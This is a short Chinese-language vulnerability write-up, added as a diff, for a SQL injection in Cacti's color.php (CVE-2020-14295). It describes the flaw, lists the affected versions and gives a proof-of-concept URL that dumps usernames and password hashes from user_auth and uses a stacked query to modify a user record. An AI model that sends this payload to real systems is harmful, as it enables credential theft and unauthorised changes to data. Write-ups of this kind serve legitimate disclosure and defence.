@@ -1,0 +1,24 @@
+# Cacti SQL 注入漏洞 CVE-2020-14295
+
+## 漏洞描述
+
+Cacti 1.2.12 中 color.php 中存在 SQL注入漏洞，允许具有管理员权限的攻击者通过 filter 参数注入 SQL。因为产品接受堆积的查询，所以这可能导致远程命令执行。目前该漏洞 EXP 已公开。
+
+参考链接：
+
+- https://github.com/Cacti/cacti/issues/3622
+
+## 漏洞影响
+
+```
+Cacti < 1.2.13
+```
+
+## 漏洞复现
+
+poc：
+
+```
+/cacti/color.php?action=export&header=false&filter=')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+user_auth+set+username='sqli'+where+id=3;--+-
+```
+
